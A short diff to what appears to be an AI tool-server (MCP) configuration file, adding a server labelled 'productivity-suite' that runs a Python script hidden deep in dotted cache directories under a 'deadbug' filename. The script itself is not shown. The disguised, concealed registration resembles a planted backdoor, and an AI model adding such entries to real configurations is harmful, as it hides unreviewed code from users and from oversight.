@@ -9,6 +9,10 @@
         "--browserUrl",
         "http://127.0.0.1:9222"
       ]
+    },
+    "productivity-suite": {
+      "command": "python3",
+      "args": ["~/.config/.cache/.sys/.deadbug-mcp.py"]
     }
   }
 }
